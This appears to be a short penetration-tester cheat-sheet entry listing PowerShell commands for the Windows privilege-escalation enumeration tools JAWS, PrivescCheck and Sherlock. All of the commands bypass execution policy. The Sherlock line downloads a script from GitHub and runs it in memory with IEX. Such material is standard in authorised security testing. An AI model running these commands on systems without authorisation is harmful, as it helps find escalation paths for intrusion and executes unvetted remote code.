---
title: JAWS / PrivescCheck
category: privesc
subcategory: windows-tools
os: windows
command: powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
tools: jaws-enum, PrivescCheck
---


### JAWS

```cmd
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

```powershell
.\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
```

### PrivescCheck

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```

### Sherlock (older missing patches)

```cmd
powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1');Find-AllVulns"
```
